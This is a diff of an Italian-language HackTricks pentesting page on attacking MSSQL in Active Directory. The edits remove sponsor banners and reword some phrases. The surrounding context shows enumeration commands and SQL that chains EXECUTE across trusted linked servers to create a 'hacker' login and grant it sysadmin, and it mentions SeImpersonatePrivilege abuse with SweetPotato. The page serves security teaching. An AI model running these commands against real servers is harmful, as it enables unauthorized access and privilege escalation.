@@ -2,15 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## **Enumerazione / Scoperta di MSSQL**
 
 ### Python
 
-Lo strumento [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) è basato su impacket e consente anche di autenticarsi utilizzando ticket kerberos e attaccare attraverso catene di link.
+Lo strumento [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) è basato su impacket e consente anche di autenticarsi utilizzando ticket kerberos e attaccare tramite catene di collegamento.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -111,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Enumerare dall'interno del dominio
+### Enumerazione dall'interno del dominio
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -226,7 +223,7 @@ EXEC sp_linkedservers;
 
 #### Eseguire query in un link affidabile
 
-Eseguire query tramite il link (esempio: trovare più link nella nuova istanza accessibile):
+Eseguire query tramite il link (esempio: trova più link nella nuova istanza accessibile):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -253,7 +250,7 @@ Puoi anche abusare dei link fidati utilizzando `EXECUTE`:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Escalazione dei privilegi locali
+## Elevazione dei privilegi locali
 
 L'**utente locale MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo consente all'account di "impersonare un client dopo l'autenticazione".
 
@@ -261,8 +258,5 @@ Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad aut
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ha una raccolta di queste varie tecniche che possono essere eseguite tramite il comando `execute-assembly` di Beacon.
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
